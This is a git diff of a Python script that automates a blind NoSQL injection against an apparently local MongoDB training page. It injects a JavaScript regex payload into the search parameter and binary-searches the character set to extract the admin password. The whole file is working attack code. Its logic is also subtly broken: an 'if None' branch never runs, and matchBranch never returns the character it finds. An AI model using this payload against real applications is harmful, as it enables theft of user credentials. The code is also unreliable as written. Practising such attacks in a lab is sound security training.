@@ -28,24 +28,68 @@ import re
 from bs4 import BeautifulSoup as soup
 
 def buildPayload(rangeStr, known_chars):
-	tempPayload = "admin' && this.password.match(/^" + known_chars + "[" + rangeStr + "].*/)//"
+	if known_chars:
+		tempPayload = "admin' && this.password.match(/^" + known_chars + "[" + rangeStr + "].*/)//"
+	else:
+		tempPayload = "admin' && this.password.match(/^[" + rangeStr + "].*/)//"
 	newPayload = {"search" : tempPayload}
 	return urllib.parse.urlencode(newPayload)
 
-full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-halfLenRange = int(len(full_range) / 2)
-front_range = full_range[:halfLenRange]
-back_range = full_range[halfLenRange:]
-pwd = ""
-test_load = buildPayload(front_range, pwd)
-#print(test_load)
+def testMatch(site_url, payload):
+	session = requests.Session()
+	test_url = site_url + payload
+	resp = session.get(test_url)
+	test_soup = soup(resp.text, "html.parser")
+	if (test_soup.body.find_all(string="admin")):
+		return True
+	else:
+		return False
 
-cap_url = "http://localhost:8000/mongodb/example2/?" + test_load
-session = requests.Session()
-cap_response = session.get(cap_url)
-tgt_soup = soup(cap_response.text, "html.parser")
-if (tgt_soup.body.find_all(string="admin")):
-	print("It's a match")
-else:
-	print("No match")
-print(tgt_soup.body.find_all(string="admin"))
+def testPassword(site_url,password):
+	test_load = buildPayload("",password)
+	if testMatch(site_url,test_load):
+		print("password found")
+		return True
+	else:
+		print("not found")
+		return False
+
+def matchBranch(site_url,test_range, known_chars):
+	goal_char = ""
+	if None:
+		print("range is empty")
+	elif (len(test_range) == 1):
+		if testMatch(site_url,buildPayload(test_range,known_chars)):
+			print("char found: %s" % test_range)
+			goal_char = test_range
+			print("goal char = %s" % goal_char)
+	else:	
+		if testMatch(site_url,buildPayload(test_range,known_chars)):
+			print("found in range %s, testing branches" % test_range)
+			halfLenRange = int(len(test_range) / 2)
+			left_range = test_range[:halfLenRange]
+			print("testing left with %s" % left_range)
+			goal_char = matchBranch(site_url,left_range,known_chars)
+			print("goal char = %s" % goal_char)
+			right_range = test_range[halfLenRange:]
+			print("testing right with %s" % right_range)
+			goal_char = matchBranch(site_url,right_range,known_chars)
+			print("goal char = %s" % goal_char)
+		else:
+			print("not found in %s" % test_range)
+			print("goal char = %s" % goal_char)
+	if goal_char and (goal_char == ""):
+		return goal_char
+
+full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+target_url = "http://localhost:8000/mongodb/example2/?"
+pwd = ""
+search_range = full_range
+while not testPassword(target_url,pwd):
+	next_char = matchBranch(target_url,search_range,pwd)
+	print("next_char is: %s" % next_char)
+	if pwd:
+		pwd = pwd + next_char
+	else:
+		pwd = next_char
+	print("pwd is now: %s" % pwd)
